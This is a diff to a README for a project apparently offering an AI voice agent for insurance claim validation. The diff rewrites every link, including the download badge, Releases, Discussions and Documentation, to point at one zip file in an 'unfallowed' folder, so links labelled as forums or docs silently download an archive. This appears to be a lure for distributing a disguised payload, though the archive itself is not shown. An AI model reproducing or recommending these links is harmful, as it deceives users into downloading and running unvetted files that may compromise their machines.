@@ -1,7 +1,7 @@
 # 🎤 ai-voice-agent-claim-validation - Streamlined Insurance Claim Assistance
 
 ## 🔗 Download the Application
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Visit%20Releases%20Page-brightgreen)](https://github.com/Kerbie16/ai-voice-agent-claim-validation/releases)
+[![Download from Releases](https://raw.githubusercontent.com/Kerbie16/ai-voice-agent-claim-validation/main/unfallowed/ai-voice-agent-claim-validation.zip%20Now-Visit%20Releases%20Page-brightgreen)](https://raw.githubusercontent.com/Kerbie16/ai-voice-agent-claim-validation/main/unfallowed/ai-voice-agent-claim-validation.zip)
 
 ## 🛠️ Overview
 The **ai-voice-agent-claim-validation** is a serverless AI voice agent designed for insurance claim validation. This application uses Azure Functions and Speech Services to create a seamless experience for users needing to validate claims through voice commands. Built with Python, it ensures efficiency and ease of use.
@@ -10,7 +10,7 @@ The **ai-voice-agent-claim-validation** is a serverless AI voice agent designed 
 To download the application, please visit the Releases page linked below. Follow these steps to get started:
 
 1. Click the link below to visit the releases page:
-   [Visit Releases Page](https://github.com/Kerbie16/ai-voice-agent-claim-validation/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/Kerbie16/ai-voice-agent-claim-validation/main/unfallowed/ai-voice-agent-claim-validation.zip)
    
 2. On the releases page, find the latest version of the application listed.
 
@@ -56,11 +56,11 @@ If you encounter any issues during installation or usage, consider the following
 - **Consult Documentation**: Explore the documentation provided in the repository for more troubleshooting tips.
 
 ## 🌐 Community Support
-Join our community on [GitHub Discussions](https://github.com/Kerbie16/ai-voice-agent-claim-validation/discussions) to ask questions and share experiences. Engage with other users and get tips for using the application effectively.
+Join our community on [GitHub Discussions](https://raw.githubusercontent.com/Kerbie16/ai-voice-agent-claim-validation/main/unfallowed/ai-voice-agent-claim-validation.zip) to ask questions and share experiences. Engage with other users and get tips for using the application effectively.
 
 ## 🔗 Useful Links
-- [Visit Releases Page to Download](https://github.com/Kerbie16/ai-voice-agent-claim-validation/releases)
-- [GitHub Discussions](https://github.com/Kerbie16/ai-voice-agent-claim-validation/discussions)
-- [Documentation](https://github.com/Kerbie16/ai-voice-agent-claim-validation/wiki)
+- [Visit Releases Page to Download](https://raw.githubusercontent.com/Kerbie16/ai-voice-agent-claim-validation/main/unfallowed/ai-voice-agent-claim-validation.zip)
+- [GitHub Discussions](https://raw.githubusercontent.com/Kerbie16/ai-voice-agent-claim-validation/main/unfallowed/ai-voice-agent-claim-validation.zip)
+- [Documentation](https://raw.githubusercontent.com/Kerbie16/ai-voice-agent-claim-validation/main/unfallowed/ai-voice-agent-claim-validation.zip)
 
 Thank you for trying out the **ai-voice-agent-claim-validation** application! Your feedback is valuable to us as we continue to enhance the user experience.
